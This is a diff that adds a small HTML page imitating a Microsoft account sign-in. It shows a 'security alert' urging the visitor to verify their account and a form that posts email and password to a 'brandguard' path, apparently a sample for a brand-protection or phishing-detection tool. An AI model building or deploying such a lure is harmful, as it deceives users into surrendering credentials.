@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft Account Security Alert</title>
+  </head>
+  <body>
+    <main>
+      <h1>Microsoft account sign in</h1>
+      <p>Security alert: verify your account to restore access.</p>
+      <form method="post" action="/brandguard-microsoft/session">
+        <label for="ms-email">Email</label>
+        <input id="ms-email" name="email" type="email" autocomplete="username" />
+        <label for="ms-password">Password</label>
+        <input id="ms-password" name="password" type="password" autocomplete="current-password" />
+        <button type="submit">Continue</button>
+      </form>
+    </main>
+  </body>
+</html>
